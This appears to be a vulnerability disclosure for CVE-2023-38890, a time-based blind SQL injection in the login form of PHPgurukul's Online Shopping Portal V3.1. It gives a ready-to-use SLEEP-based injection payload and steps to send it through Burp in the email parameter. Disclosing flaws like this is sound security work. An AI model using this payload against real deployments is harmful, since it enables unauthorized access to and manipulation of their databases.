# CVE-2023-38890
### Description
[Online Shopping Portal Project V3.1 ](https://phpgurukul.com/shopping-portal-free-download/) allows remote attackers to execute arbitrary SQL commands/queries via the login form, leading to unauthorized access and potential data manipulation. This vulnerability arises due to insufficient validation of user-supplied input in the username field, enabling SQL Injection attacks.

</br>

**Exploit Title:** Online Shopping Portal Project V3.1 PHPgurukul - Time-Based Blind Sqli

**Exploit Author:** Akshad Joshi

**Vendor Homepage:** https://phpgurukul.com

**Software Link:** https://phpgurukul.com/shopping-portal-free-download/

**Tested on:** Linux

## Steps to Reproduce

***use this payload*** *(url encode it)*:
```sql
test1@test.com' AND (SELECT 1866 FROM (SELECT(SLEEP(10)))JHcH) AND 'GMDH'='GMDH
```
1. visit-http://localhost/shopping/login.php
2. login via the account you created.
3. there is front end validation so capture the request in burp .
4. pass the above payload in email parameter and observe the response time
